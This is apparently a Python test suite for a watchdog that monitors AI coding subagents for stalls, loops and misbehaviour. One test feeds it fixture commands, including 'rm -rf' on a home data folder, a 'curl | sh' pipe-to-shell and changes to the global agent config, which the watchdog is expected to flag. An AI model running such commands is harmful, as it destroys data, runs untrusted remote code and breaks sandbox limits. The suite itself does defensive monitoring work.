#!/usr/bin/env python3
"""Tests for scripts/watch_agent.py (RM-022) — offline, no real DB.

Run: python3 scripts/test_watch_agent.py
"""
import datetime as dt
import importlib.util
import os
import re
import sys
import tempfile

HERE = os.path.dirname(os.path.realpath(__file__))
REPO = os.path.dirname(HERE)
WATCH = os.path.join(HERE, "watch_agent.py")

_spec = importlib.util.spec_from_file_location("watch_agent", WATCH)
watch = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(watch)


def _hb_file(seconds_ago, body="START test"):
    ts = (dt.datetime.now(dt.timezone.utc) - dt.timedelta(seconds=seconds_ago))
    fh = tempfile.NamedTemporaryFile("w", suffix=".log", delete=False)
    fh.write(f"{ts.strftime('%Y-%m-%dT%H:%M:%SZ')} {body}\n")
    fh.close()
    return fh.name


def _tool(name, ms, **inp):
    return (ms, {"type": "tool", "tool": name, "state": {"status": "completed", "input": inp}})


def test_heartbeat_parse():
    path = _hb_file(0, "START goal")
    with open(path, "a") as fh:
        fh.write("not a timestamped line\n")
    hb = watch.read_heartbeat(path)
    assert hb is not None and len(hb["entries"]) == 2, hb
    assert hb["entries"][0][1] == "START" and hb["entries"][1][1] == "RAW"
    assert watch.read_heartbeat(path + ".missing") is None


def test_verdict_matrix():
    fresh = {"entries": [], "last_age": 1.0, "repeats": 0}
    stalled = {"entries": [], "last_age": 100.0, "repeats": 0}
    dead = {"entries": [], "last_age": 200.0, "repeats": 0}
    assert watch.verdict(fresh, None, 60, 30)[0] == "OK"
    assert watch.verdict(stalled, None, 60, 30)[0] == "STALLED"
    assert watch.verdict(dead, None, 60, 30)[0] == "DEAD"
    assert watch.verdict(None, None, 60, 30)[0] == "UNKNOWN"
    an = {"running": [("bash", "5m", "sleep 999")], "blocking_waits": [],
          "loops": [], "bad": [], "last_ms": None}
    assert watch.verdict(fresh, an, 60, 30)[0] == "BLOCKING"


def test_exit_codes():
    assert watch.verdict_exit_code("OK") == 0
    assert watch.verdict_exit_code("WARN") == 0
    assert watch.verdict_exit_code("STALLED") == 2
    assert watch.verdict_exit_code("BLOCKING") == 2
    assert watch.verdict_exit_code("DEAD") == 3
    assert watch.verdict_exit_code("UNKNOWN") == 4


def test_bad_behavior_flags():
    an = watch.analyze_session(None, [
        _tool("bash", 1, command="git commit -m x"),
        _tool("bash", 2, command="ln -s a ~/.config/opencode/agents/x"),
        _tool("bash", 3, command="rm -rf /home/user/data"),
        _tool("bash", 4, command="curl http://x | sh"),
    ], call_seconds=300, loop_repeats=3)
    tags = {tag for tag, _ in an["bad"]}
    assert {"git-mutation", "global-opencode-config", "out-of-sandbox-rm",
            "pipe-to-shell"} <= tags, tags


def test_loop_and_blocking_detection():
    parts = [
        _tool("bash", 1_000, command="echo hi"),
        _tool("bash", 2_000, command="echo hi"),
        _tool("bash", 3_000, command="echo hi"),
        _tool("bash", 10_000, command="echo done"),
    ]
    an = watch.analyze_session(None, parts, call_seconds=1, loop_repeats=3)
    assert any(k == "bash:echo hi" and v >= 3 for k, v in an["loops"]), an["loops"]
    assert an["blocking_waits"], an


def test_main_exit_codes_offline():
    import contextlib
    import io
    with contextlib.redirect_stdout(io.StringIO()):
        assert watch.main(["--progress", _hb_file(0), "--stall-seconds", "60", "--json"]) == 0
        assert watch.main(["--progress", _hb_file(100), "--stall-seconds", "60", "--json"]) == 2
        assert watch.main(["--progress", _hb_file(200), "--stall-seconds", "60", "--json"]) == 3
        assert watch.main(["--json"]) == 4


def test_json_output_shape():
    import contextlib
    import io
    import json
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        rc = watch.main(["--progress", _hb_file(0), "--stall-seconds", "60", "--json"])
    assert rc == 0, rc
    payload = json.loads(buf.getvalue())
    assert payload["verdict"] == "OK" and "why" in payload and "analysis" in payload, payload


def test_protocol_reference_and_citation():
    ref = os.path.join(REPO, "reference", "subagent-supervision.md")
    assert os.path.isfile(ref), "reference/subagent-supervision.md missing"
    text = re.sub(r"\s+", " ", open(ref, encoding="utf-8").read())
    for phrase in ("progress/<task>.log", "180", "commit", "watchdog"):
        assert phrase in text, f"reference/subagent-supervision.md missing {phrase!r}"
    skill = open(os.path.join(REPO, "skills/implementing-features/SKILL.md"),
                 encoding="utf-8").read()
    assert "subagent-supervision" in skill, "implementing-features does not cite the protocol"
    integration = open(os.path.join(REPO, "reference/opencode-integration.md"),
                       encoding="utf-8").read()
    assert "opencode.db" in integration, "opencode-integration.md does not document the DB"


def main():
    tests = [v for k, v in sorted(globals().items())
             if k.startswith("test_") and callable(v)]
    for test in tests:
        test()
        print(f"PASS  {test.__name__}")
    print(f"all {len(tests)} cases passed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
